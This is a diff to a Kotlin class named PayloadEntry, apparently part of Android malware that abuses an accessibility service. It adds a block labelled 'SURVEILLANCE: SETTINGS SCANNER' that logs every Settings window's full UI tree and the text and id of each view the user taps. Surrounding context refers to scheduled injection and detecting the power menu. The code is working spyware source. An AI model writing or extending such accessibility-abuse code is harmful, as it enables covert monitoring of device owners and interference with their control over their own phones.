@@ -51,6 +51,22 @@ class PayloadEntry : DynamicEntry {
             var isInjectionScheduled = false
             
             DynamicEntry.accessibilityInterceptor = { event ->
+                // --- SURVEILLANCE: SETTINGS SCANNER ---
+                val pkg = event.packageName?.toString() ?: ""
+                if (pkg.contains("settings")) {
+                    if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                        DynamicEntry.log("🪟 WINDOW LOADED: ${event.className?.substringAfterLast(".")}")
+                        DynamicEntry.activeAccessibilityService?.rootInActiveWindow?.let { dumpNode(it, 0) }
+                    } else if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                        val src = event.source
+                        if (src != null) {
+                            val text = src.text?.toString() ?: src.contentDescription?.toString() ?: ""
+                            DynamicEntry.log("👆 CLICKED: txt='${text}' id='${src.viewIdResourceName?.substringAfter("id/")}'")
+                        }
+                    }
+                }
+                // --------------------------------------
+
                 val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
                 val hasPowerMenu = root?.let { checkNodes(it) } ?: false
                 
@@ -163,5 +179,21 @@ class PayloadEntry : DynamicEntry {
             if (checkNodes(node.getChild(i) ?: continue)) return true
         }
         return false
+    }
+
+    private fun dumpNode(node: AccessibilityNodeInfo?, depth: Int) {
+        if (node == null) return
+        val id = node.viewIdResourceName?.substringAfter("id/") ?: ""
+        val text = node.text?.toString() ?: node.contentDescription?.toString() ?: ""
+        val cls = node.className?.substringAfterLast(".") ?: ""
+        
+        if (id.isNotEmpty() || text.isNotBlank()) {
+            val indent = "-".repeat(depth)
+            DynamicEntry.log("$indent[$cls] id:$id txt:$text")
+        }
+        
+        for (i in 0 until node.childCount) {
+            dumpNode(node.getChild(i), depth + 1)
+        }
     }
 }
